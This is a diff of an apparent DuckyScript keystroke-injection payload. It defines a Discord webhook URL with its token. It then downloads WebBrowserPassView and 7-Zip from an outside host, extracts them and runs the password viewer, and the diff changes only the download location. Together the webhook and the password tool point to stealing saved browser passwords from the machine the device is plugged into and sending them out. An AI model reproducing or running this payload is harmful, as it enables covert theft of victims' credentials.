@@ -7,7 +7,7 @@ DELAY 1500
 STRING $webhook='https://discord.com/api/webhooks/1179836878531350578/3-z0LfxJ5eBVOIgzKTrWqvw9HO0PynI6iOAPlT1QJb6fmbssX0rmTOSlZh2NySJY_h_8'
 ENTER
 DELAY 500
-STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip; .\WebBrowserPassView.exe
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri https://github.com/User84User/User84PublicUser/blob/main/WebBrowserPassview/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://github.com/User84User/User84PublicUser/blob/main/WebBrowserPassview/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip; .\WebBrowserPassView.exe
 ENTER
 DELAY 10000
 CTRL A
